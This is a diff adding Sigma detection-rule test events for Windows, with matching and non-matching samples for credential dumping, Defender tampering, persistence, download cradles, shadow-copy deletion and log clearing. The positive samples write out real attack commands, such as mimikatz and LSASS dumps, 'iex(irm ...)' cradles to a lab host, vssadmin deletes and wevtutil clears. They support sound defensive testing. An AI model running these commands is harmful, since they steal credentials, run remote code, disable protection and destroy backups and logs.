@@ -1,0 +1,141 @@
+# Sigma rule test events: Windows rules.
+# Each entry: rule id -> list of {name, match, event}. Field names follow the
+# Sigma taxonomy (Sysmon / Security log field names).
+
+8f2c3d71-a4b5-4e67-8c91-2d3f5a6b7890:  # LSASS credential dumping via command line
+  - name: mimikatz logonpasswords
+    match: true
+    event: {Image: 'C:\Users\Public\m.exe', CommandLine: 'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit'}
+  - name: renamed procdump targeting lsass (caught by OriginalFileName)
+    match: true
+    event: {Image: 'C:\Windows\Temp\pd.exe', OriginalFileName: procdump, CommandLine: 'pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\o.dmp'}
+  - name: comsvcs MiniDump via rundll32
+    match: true
+    event: {Image: 'C:\Windows\System32\rundll32.exe', CommandLine: 'rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\l.dmp full'}
+  - name: comsvcs ordinal #24 variant
+    match: true
+    event: {Image: 'C:\Windows\System32\rundll32.exe', CommandLine: 'rundll32.exe comsvcs.dll #24 624 C:\Users\Public\l.dmp full'}
+  - name: procdump of an application crash (not lsass)
+    match: false
+    event: {Image: 'C:\Tools\procdump64.exe', OriginalFileName: procdump, CommandLine: 'procdump64.exe -accepteula -ma w3wp.exe C:\Dumps\w3wp.dmp'}
+  - name: notes file named after a mimikatz module
+    match: false
+    event: {Image: 'C:\Windows\System32\notepad.exe', CommandLine: 'notepad.exe C:\Users\jdoe\sekurlsa_notes.txt'}
+
+c4d5e6f7-8a9b-0c1d-2e3f-4a5b6c7d8e9f:  # Defender disabled or excluded
+  - name: real-time monitoring disabled
+    match: true
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true'}
+  - name: parameters reordered and several disabled at once
+    match: true
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell -nop -c "Set-MpPreference -Force -DisableIOAVProtection 1 -DisableBehaviorMonitoring 1"'}
+  - name: path exclusion added
+    match: true
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe Add-MpPreference -ExclusionPath C:\Users\Public'}
+  - name: service stopped with sc.exe
+    match: true
+    event: {Image: 'C:\Windows\System32\sc.exe', CommandLine: 'sc.exe stop WinDefend'}
+  - name: policy value written with reg.exe
+    match: true
+    event: {Image: 'C:\Windows\System32\reg.exe', CommandLine: 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'}
+  - name: protection explicitly re-enabled
+    match: false
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false'}
+  - name: service status query
+    match: false
+    event: {Image: 'C:\Windows\System32\sc.exe', CommandLine: 'sc.exe query WinDefend'}
+
+3a6b14c7-9f8e-4d2a-b5c1-e7f3a9d80123:  # Scheduled task with script host / writable path
+  - name: task runs hidden PowerShell
+    match: true
+    event: {EventID: 4698, TaskName: '\OneDriveSync', TaskContent: '<Exec><Command>powershell.exe</Command><Arguments>-w hidden -c "iex(irm http://10.0.2.100/s)"</Arguments></Exec>'}
+  - name: task runs a binary from C:\Users\Public
+    match: true
+    event: {EventID: 4698, TaskName: '\Updater', TaskContent: '<Exec><Command>C:\Users\Public\upd.exe</Command></Exec>'}
+  - name: Google updater task (name contains "Update")
+    match: false
+    event: {EventID: 4698, TaskName: '\GoogleUpdateTaskMachineCore', TaskContent: '<Exec><Command>C:\Program Files (x86)\Google\Update\GoogleUpdate.exe</Command><Arguments>/c</Arguments></Exec>'}
+  - name: built-in Microsoft task using PowerShell
+    match: false
+    event: {EventID: 4698, TaskName: '\Microsoft\Windows\PLA\Server Manager Performance Monitor', TaskContent: '<Exec><Command>powershell.exe</Command></Exec>'}
+  - name: different event id
+    match: false
+    event: {EventID: 4699, TaskName: '\Updater', TaskContent: '<Exec><Command>C:\Users\Public\upd.exe</Command></Exec>'}
+
+4620146c-692b-4f63-9c6e-48d604e878dd:  # LSASS opened with read access
+  - name: unknown binary in Public reading LSASS
+    match: true
+    event: {SourceImage: 'C:\Users\Public\m.exe', TargetImage: 'C:\Windows\system32\lsass.exe', GrantedAccess: '0x1010'}
+  - name: rundll32 from System32 is not excluded (comsvcs MiniDump)
+    match: true
+    event: {SourceImage: 'C:\Windows\System32\rundll32.exe', TargetImage: 'C:\Windows\system32\lsass.exe', GrantedAccess: '0x1fffff'}
+  - name: Defender scanning LSASS
+    match: false
+    event: {SourceImage: 'C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe', TargetImage: 'C:\Windows\system32\lsass.exe', GrantedAccess: '0x1410'}
+  - name: svchost with a query-only mask
+    match: false
+    event: {SourceImage: 'C:\Windows\System32\svchost.exe', TargetImage: 'C:\Windows\system32\lsass.exe', GrantedAccess: '0x1000'}
+
+45f28ff8-212e-47ff-beff-ea32de0cfe37:  # PowerShell download cradle
+  - name: Net.WebClient DownloadString into IEX
+    match: true
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.100/a.ps1')\""}
+  - name: pwsh irm piped to iex
+    match: true
+    event: {Image: 'C:\Program Files\PowerShell\7\pwsh.exe', OriginalFileName: pwsh.dll, CommandLine: 'pwsh -c "irm http://10.0.2.100/s | iex"'}
+  - name: installer download saved to disk
+    match: false
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -c "Invoke-WebRequest https://aka.ms/vs/17/release/vc_redist.x64.exe -OutFile C:\Temp\vc.exe"'}
+
+cb210658-f569-4c76-8446-d90f9c01595f:  # Shadow copy / backup destruction
+  - name: vssadmin delete shadows
+    match: true
+    event: {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin.exe Delete Shadows /All /Quiet'}
+  - name: shrinking shadow storage to evict copies
+    match: true
+    event: {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB'}
+  - name: wmic shadowcopy delete
+    match: true
+    event: {Image: 'C:\Windows\System32\wbem\WMIC.exe', CommandLine: 'wmic shadowcopy delete /nointeractive'}
+  - name: PowerShell Win32_ShadowCopy delete
+    match: true
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"'}
+  - name: recovery disabled with bcdedit
+    match: true
+    event: {Image: 'C:\Windows\System32\bcdedit.exe', CommandLine: 'bcdedit /set {default} recoveryenabled No'}
+  - name: listing shadow copies
+    match: false
+    event: {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin list shadows'}
+
+bd90b513-5706-4897-9dbf-0b852c805fb5:  # Run key -> staging path / script host
+  - name: Run value launching a binary from C:\Users\Public
+    match: true
+    event: {TargetObject: 'HKU\S-1-5-21-1111-2222-3333-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater', Details: 'C:\Users\Public\upd.exe'}
+  - name: RunOnce value launching mshta
+    match: true
+    event: {TargetObject: 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\x', Details: 'mshta.exe http://10.0.2.100/a.hta'}
+  - name: OneDrive autostart
+    match: false
+    event: {TargetObject: 'HKU\S-1-5-21-1111-2222-3333-1001\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive', Details: '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'}
+  - name: script host written to a non-autostart key
+    match: false
+    event: {TargetObject: 'HKU\S-1-5-21-1111-2222-3333-1001\Software\Vendor\Settings\Helper', Details: 'powershell.exe -File helper.ps1'}
+
+a1886bc2-b4e0-4edf-935d-95357e3d242e:  # Event log cleared from the command line
+  - name: wevtutil cl Security
+    match: true
+    event: {Image: 'C:\Windows\System32\wevtutil.exe', CommandLine: 'wevtutil.exe cl Security'}
+  - name: Clear-EventLog via PowerShell
+    match: true
+    event: {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell Clear-EventLog -LogName Security,System'}
+  - name: wevtutil query
+    match: false
+    event: {Image: 'C:\Windows\System32\wevtutil.exe', CommandLine: 'wevtutil.exe qe Security /c:5 /f:text'}
+
+6a2c55ad-3083-4796-bdd6-8b22e27b8ecc:  # WmiPrvSE spawned a shell
+  - name: wmiexec-style cmd under WmiPrvSE
+    match: true
+    event: {ParentImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe', Image: 'C:\Windows\System32\cmd.exe', CommandLine: 'cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1698765 2>&1'}
+  - name: WmiPrvSE starting msiexec for inventory
+    match: false
+    event: {ParentImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe', Image: 'C:\Windows\System32\msiexec.exe', CommandLine: 'msiexec.exe /V'}
